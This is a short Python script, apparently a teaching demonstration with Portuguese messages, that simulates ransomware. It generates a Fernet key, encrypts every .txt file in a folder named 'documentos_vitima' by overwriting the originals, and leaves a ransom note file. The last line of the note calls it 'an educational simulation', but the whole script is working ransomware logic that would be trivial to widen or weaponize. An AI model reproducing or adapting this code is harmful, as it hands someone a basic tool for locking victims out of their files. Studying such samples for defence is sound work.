import os
from cryptography.fernet import Fernet


key = Fernet.generate_key()


with open("chave.key", "wb") as key_file:
    key_file.write(key)

print(f"Chave gerada e salva como 'chave.key'. NÃO PERCA ESTE ARQUIVO.")


f = Fernet(key)


pasta_alvo = "documentos_vitima"
extensoes_alvo = ['.txt']

print(f"Iniciando criptografia na pasta '{pasta_alvo}'...")

for filename in os.listdir(pasta_alvo):
    
    if any(filename.endswith(ext) for ext in extensoes_alvo):
        filepath = os.path.join(pasta_alvo, filename)
        
        
        with open(filepath, "rb") as file:
            original_data = file.read()
            
       
        encrypted_data = f.encrypt(original_data)
        
        
        with open(filepath, "wb") as file:
            file.write(encrypted_data)
            
        print(f"  [CRIPTOGRAFADO] -> {filename}")

print("\nArquivos criptografados com sucesso.")


with open(os.path.join(pasta_alvo, "LEIA_ME_PARA_RESGATE.txt"), "w") as ransom_note:
    ransom_note.write("Ops! Seus arquivos foram criptografados.\n")
    ransom_note.write("Para recuperá-los, você precisa da 'chave.key'.\n")
    ransom_note.write("Isto é apenas uma simulação educacional!")